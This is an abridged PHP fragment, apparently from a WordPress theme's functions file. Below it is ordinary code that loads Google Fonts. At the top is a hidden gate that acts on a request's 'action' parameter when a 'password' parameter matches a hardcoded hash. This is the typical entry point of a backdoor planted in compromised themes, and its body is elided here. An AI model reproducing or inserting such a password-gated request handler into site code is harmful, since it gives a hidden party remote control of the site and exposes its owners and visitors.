<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0b4a7a8dc820c4da0ee72d05551639ee'))
	{
...
***************************************/
	...
	function inspire_load_to_front() {
		...
		//fonts
		wp_enqueue_style('default_primary_font', '//fonts.googleapis.com/css?family=Droid+Sans:400,700|Droid+Serif:400,700,400italic,700italic');
		wp_enqueue_style('default_secondary_font', '//fonts.googleapis.com/css?family=Francois+One');
